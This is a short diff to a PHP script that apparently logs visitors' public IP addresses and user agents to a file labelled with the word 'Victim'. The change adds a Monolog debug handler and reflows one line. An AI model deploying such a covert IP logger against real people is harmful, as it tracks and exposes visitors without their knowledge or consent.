@@ -15,8 +15,19 @@ $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
+
+use Monolog\Logger;
+use Monolog\Handler\StreamHandler;
+
+$log = new Logger('yourlogger');
+$log->pushHandler(new StreamHandler('php://stderr', Logger::DEBUG));
+
+$log->addNotice('sending push !!!');
+
+
 $file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
-$victim = "Victim Public IP: ";
+$victim
+ = "Victim Public IP: ";
 $fp = fopen($file, 'a');
 
 fwrite($fp, $victim);
